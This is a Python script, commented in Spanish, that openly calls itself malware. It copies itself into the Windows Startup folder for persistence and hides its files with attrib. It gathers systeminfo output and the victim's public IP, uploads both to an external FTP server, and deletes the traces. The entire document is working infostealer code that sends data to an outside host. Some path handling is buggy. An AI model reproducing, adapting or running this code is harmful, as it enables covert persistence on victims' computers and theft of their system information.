import os
import ftplib

session = ftplib.FTP('files.000webhost.com','000webhost-name','000000webhost-password')

info_ip = None

# Nombre del usuario
user = os.environ.get('USERNAME')

# Directorio startup
save_dir = 'C:\\Users\{a}\AppData\Roaming\Microsoft\Windows\\"Start Menu"\Programs\Startup'.format(a = user)

# Directorio del malware
actual_dir = os.path.dirname(os.path.realpath(__file__)) + "\Try.py"
os.system('attrib +R +H +S {a}'.format(a = actual_dir + "\Try.py"))

while True:
    # Guardar el malware para iniciar con Windows
    malware = os.popen("if EXIST {a} (echo Estado del malware: OK) else (copy {b} {c})".format(a = save_dir + "\Try.py", b = actual_dir, c = save_dir)).read()

    # Esconder
    os.system('attrib +R +H +S {a}'.format(a = save_dir + "\Try.py"))


    if info_ip == None:
        info_sys = os.popen('systeminfo > sys.txt').read()
        info_ip = "\n", os.popen('nslookup myip.opendns.com. resolver1.opendns.com > ip.txt').read()
        os.system('attrib +R +H sys.txt')
        os.system('attrib +R +H ip.txt')
    else:
        info_sys = open('sys.txt','rb')
        info_ip = open('ip.txt', 'rb')
        session.storbinary('STOR '+'sys.txt', info_sys)
        session.storbinary('STOR '+'ip.txt', info_ip)
        info_sys.close()
        info_ip.close()
        session.quit()

    os.system('del /F /Q sys.txt')
    os.system('del /F /Q ip.txt')
